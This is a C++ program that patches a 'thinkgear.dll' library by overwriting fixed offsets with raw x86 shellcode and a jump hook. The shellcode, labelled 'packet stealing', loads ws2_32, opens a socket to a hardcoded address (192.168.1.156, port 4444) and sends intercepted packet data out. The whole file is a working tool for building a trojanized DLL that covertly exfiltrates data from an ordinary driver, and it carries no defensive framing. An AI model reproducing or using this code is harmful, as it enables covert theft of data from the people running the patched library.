
#include <stdio.h>
#include <fstream>
#include <vector>

#define PACKET_STEAL_OFFSET 0x11824
#define JUMP_OFFSET 0x1119

using namespace std;

char g_InjectRawpacketSteal[] = {
	0x8B, 0xF4, 0x8B, 0xFD, 0x50, 0x53, 0x51, 0x52, 0x56, 0x57, 0x8B, 0xF0, 0x31, 0xC0, 0x66, 0xB8, 0x33, 0x32, 0x50, 0x68,
	0x77, 0x73, 0x32, 0x5F, 0x54, 0xBB, 0x9F, 0x49, 0xB2, 0x75, 0xFF, 0xD3, 0x89, 0xC5, 0x31, 0xC0, 0x66, 0xB8, 0x75, 0x70,
	0x50, 0x68, 0x74, 0x61, 0x72, 0x74, 0x68, 0x57, 0x53, 0x41, 0x53, 0x54, 0x55, 0xBB, 0x22, 0x12, 0xB2, 0x75, 0xFF, 0xD3,
	0x31, 0xDB, 0x66, 0xBB, 0x90, 0x01, 0x29, 0xDC, 0x54, 0x53, 0xFF, 0xD0, 0x31, 0xC0, 0x66, 0xB8, 0x74, 0x41, 0x50, 0x68,
	0x6F, 0x63, 0x6B, 0x65, 0x68, 0x57, 0x53, 0x41, 0x53, 0x54, 0x55, 0xBB, 0x22, 0x12, 0xB2, 0x75, 0xFF, 0xD3, 0x31, 0xDB,
	0x53, 0x53, 0x53, 0x31, 0xC9, 0xB1, 0x06, 0x51, 0x43, 0x53, 0x43, 0x53, 0xFF, 0xD0, 0x97, 0xBB, 0x65, 0x65, 0x63, 0x74,
	0xC1, 0xEB, 0x08, 0x53, 0x68, 0x63, 0x6F, 0x6E, 0x6E, 0x54, 0x55, 0xBB, 0x22, 0x12, 0xB2, 0x75, 0xFF, 0xD3, 0x68, 0xC0,
	0xA8, 0x01, 0x9C, 0x66, 0x68, 0x11, 0x5C, 0x31, 0xDB, 0x80, 0xC3, 0x02, 0x66, 0x53, 0x89, 0xE2, 0x6A, 0x10, 0x52, 0x57,
	0xFF, 0xD0, 0x6A, 0x00, 0x68, 0x73, 0x65, 0x6E, 0x64, 0x54, 0x55, 0xBB, 0x22, 0x12, 0xB2, 0x75, 0xFF, 0xD3, 0xD9, 0x9C,
	0x24, 0x44, 0x02, 0x00, 0x00, 0x89, 0xB4, 0x24, 0x48, 0x02, 0x00, 0x00, 0xC7, 0x84, 0x24, 0x4C, 0x02, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x6A, 0x00, 0x6A, 0x08, 0x8D, 0x9C, 0x24, 0x4C, 0x02, 0x00, 0x00, 0x53, 0x57, 0xFF, 0xD0, 0xBB, 0x6B,
	0x6B, 0x65, 0x74, 0xC1, 0xEB, 0x08, 0x53, 0x68, 0x65, 0x73, 0x6F, 0x63, 0x68, 0x63, 0x6C, 0x6F, 0x73, 0x54, 0x55, 0xBB,
	0x22, 0x12, 0xB2, 0x75, 0xFF, 0xD3, 0x57, 0xFF, 0xD0, 0x81, 0xC4, 0xD4, 0x01, 0x00, 0x00, 0x8B, 0xEC, 0x83, 0xC5, 0x14,
	0x5F, 0x5E, 0x5A, 0x59, 0x5B, 0x58, 0x8B, 0xE6, 0x8B, 0xEF, 0xE9, 0xE7, 0xF7, 0xFE, 0xFF
};

char g_InejectJmp[] = {
	0xE9, 0x06, 0x07, 0x01, 0x00, 0xC3, 0x90
};


int main(int argc, char** argv)
{
	char* input_dll_path;
	char* output_dll_path;

	if (argc != 3) {
		printf("Usage: thinkgear.dll, output.dll\n" );
		return 0;
	}
	else
	{
		input_dll_path = argv[1];
		output_dll_path = argv[2];
	}

	ifstream input(input_dll_path, ios::binary);
	ofstream output(output_dll_path, ios::out | ios::binary);
	// store target binary into buffer vector
	vector<char> buffer((istreambuf_iterator<char>(input)), (istreambuf_iterator<char>()));


	//copy steal packet shellcode to buffer at right offset
	printf("Copying packet stealing shellcode...\n");
	for (int i = 0; i < sizeof(g_InjectRawpacketSteal) / sizeof(g_InjectRawpacketSteal[0]); i++) {
		buffer[PACKET_STEAL_OFFSET + i] = g_InjectRawpacketSteal[i];
	}

	//copy steal packet shellcode to buffer at right offset
	printf("Copying jump shellcode...\n");
	for (int i = 0; i < sizeof(g_InejectJmp) / sizeof(g_InejectJmp[0]); i++) {
		buffer[JUMP_OFFSET + i] = g_InejectJmp[i];
	}

	// write to output file
	printf("Writing binary to file %s...\n", output_dll_path);
	output.write((char*)&buffer[0], buffer.size() * sizeof(char));
	output.close();
	
    return 0;
}

